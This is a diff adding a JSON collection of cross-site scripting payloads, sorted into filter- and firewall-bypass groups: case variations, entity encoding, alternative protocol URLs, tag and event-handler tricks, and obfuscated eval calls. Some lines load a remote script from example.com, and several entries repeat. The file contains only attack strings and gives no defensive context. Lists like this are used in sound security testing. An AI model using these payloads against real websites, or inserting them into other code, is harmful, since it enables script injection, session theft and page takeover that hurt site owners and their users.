@@ -1,0 +1,110 @@
+{
+  "waf_bypass": [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<iframe onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<audio src=x onerror=alert(1)>",
+    "<video src=x onerror=alert(1)>",
+    "<marquee onstart=alert(1)>"
+  ],
+  "case_variations": [
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<IMG SRC=x OnErRoR=alert(1)>",
+    "<SvG OnLoAd=alert(1)>",
+    "<BoDy OnLoAd=alert(1)>",
+    "<IfRaMe OnLoAd=alert(1)>",
+    "<InPuT AuToFoCuS OnFoCuS=alert(1)>",
+    "<DeTaIlS OpEn OnToGgLe=alert(1)>",
+    "<AuDiO SrC=x OnErRoR=alert(1)>",
+    "<ViDeO SrC=x OnErRoR=alert(1)>",
+    "<MaRqUeE OnStArT=alert(1)>"
+  ],
+  "encoding_bypass": [
+    "<script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>",
+    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<body onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<iframe onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<input autofocus onfocus=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<details open ontoggle=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<audio src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<video src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<marquee onstart=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"
+  ],
+  "quotes_bypass": [
+    "<img src=x onerror=alert`1`>",
+    "<img src=x onerror=\"alert(1)\">",
+    "<img src=x onerror='alert(1)'>",
+    "<img src=x onerror=alert&lpar;1&rpar;>",
+    "<img src=x onerror=alert&#40;1&#41;>",
+    "<img src=x onerror=alert(1)>",
+    "<img src=x onerror=alert(String.fromCharCode(49))>",
+    "<img src=x onerror=eval('ale'+'rt(1)')>",
+    "<img src=x onerror=window['ale'+'rt'](1)>",
+    "<img src=x onerror=this['ale'+'rt'](1)>"
+  ],
+  "spaces_bypass": [
+    "<img/src=x/onerror=alert(1)>",
+    "<img\nsrc=x\nonerror=alert(1)>",
+    "<img\tsrc=x\tonerror=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<img src='x'onerror='alert(1)'>",
+    "<img src=\"x\"onerror=\"alert(1)\">",
+    "<img src=x onerror=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<img src=x onerror=alert(1)>"
+  ],
+  "protocol_bypass": [
+    "<a href=javascript:alert(1)>click</a>",
+    "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>",
+    "<a href=vbscript:alert(1)>click</a>",
+    "<a href=javascript&colon;alert(1)>click</a>",
+    "<a href=javascript&#58;alert(1)>click</a>",
+    "<a href=javascript&#x3A;alert(1)>click</a>",
+    "<a href=j&#97;v&#97;script&#x3A;alert(1)>click</a>",
+    "<a href=javascript:alert(1)>click</a>",
+    "<a href=javascript:alert(1)>click</a>",
+    "<a href=javascript:alert(1)>click</a>"
+  ],
+  "tag_bypass": [
+    "<%00script>alert(1)<%00/script>",
+    "<script x>alert(1)</script x>",
+    "<script ~~~>alert(1)</script ~~~>",
+    "<script/x>alert(1)</script/x>",
+    "<script/src=data:,alert(1)>",
+    "<script/src=//example.com/alert.js>",
+    "<script/src=https://example.com/alert.js>",
+    "<script/src=http://example.com/alert.js>",
+    "<script/src=//example.com/alert.js>",
+    "<script/src=//example.com/alert.js>"
+  ],
+  "event_bypass": [
+    "<svg/onload=alert(1)>",
+    "<svg//onload=alert(1)>",
+    "<svg onload=alert(1)//",
+    "<svg onload=alert(1) //",
+    "<svg onload=alert(1) /*",
+    "<svg onload=alert(1) */",
+    "<svg onload=alert(1) <!--",
+    "<svg onload=alert(1) -->",
+    "<svg onload=alert(1) <?",
+    "<svg onload=alert(1) ?>"
+  ],
+  "filter_bypass": [
+    "<script>setInterval`alert\x28document.domain\x29`</script>",
+    "<script>setTimeout`alert\x28document.domain\x29`</script>",
+    "<script>eval`alert\x28document.domain\x29`</script>",
+    "<script>Function`alert\x28document.domain\x29```</script>",
+    "<script>new Function`alert\x28document.domain\x29`</script>",
+    "<script>this[`alert`]`1`</script>",
+    "<script>window[`alert`]`1`</script>",
+    "<script>self[`alert`]`1`</script>",
+    "<script>top[`alert`]`1`</script>",
+    "<script>parent[`alert`]`1`</script>"
+  ]
+}
